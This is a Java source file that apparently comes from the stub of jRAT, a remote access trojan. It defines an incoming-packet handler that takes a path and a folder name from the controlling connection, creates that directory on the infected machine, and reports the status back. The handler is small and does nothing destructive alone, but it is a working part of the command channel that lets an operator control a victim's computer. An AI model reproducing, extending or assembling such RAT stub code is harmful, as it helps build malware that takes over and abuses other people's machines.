package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.stub.Connection;
import se.jrat.stub.Constants;


public class Packet43CreateDirectory extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String where = con.readLine();
		String name = con.readLine();

		File file = new File(where + File.separator + name);
		file.mkdirs();
		con.status(Constants.STATUS_MKDIR);
	}

}
